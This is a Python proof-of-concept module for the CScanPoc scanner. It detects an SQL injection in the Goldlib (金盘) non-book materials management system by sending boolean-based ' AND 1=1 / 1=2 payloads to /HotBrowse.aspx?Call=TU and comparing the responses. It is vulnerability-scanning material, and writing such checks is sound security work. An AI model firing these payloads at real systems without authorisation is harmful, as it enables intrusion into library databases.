# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Goldlib_0006'  # 平台漏洞编号，留空
    name = '金盘非书资料管理系统 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-05-27'  # 漏洞公布时间
    desc = '''
        金盘非书资料管理系统是面向图书馆等部门的非书资料管理系统,它集信息加工、资源发布、文件浏览于一体。
        金盘非书资料管理系统 /HotBrowse.aspx?Call=TU SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=062061'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金盘非书资料管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd7f621b5-4f79-4eae-8404-5b497d2e08de'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # refer:http://www.wooyun.org/bugs/wooyun-2010-062061
            payload = '/HotBrowse.aspx?Call=TU'
            getdata1 = '%25%27%20AND%201%3D1%20AND%20%27%25%27%3D%27'
            getdata2 = '%25%27%20AND%201%3D2%20AND%20%27%25%27%3D%27'
            url1 = self.target + payload + getdata1
            url2 = self.target + payload + getdata2
            code1, head, res1, errcode, _ = hh.http(url1)
            code2, head, res2, errcode, _ = hh.http(url2)
            if code1 == 200 and code2 == 200 and 'ASPxGridView1_DXDataRow0' in res1 and 'ASPxGridView1_DXDataRow0' not in res2:
                #security_hole(arg+payload+'   :found sql Injection')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
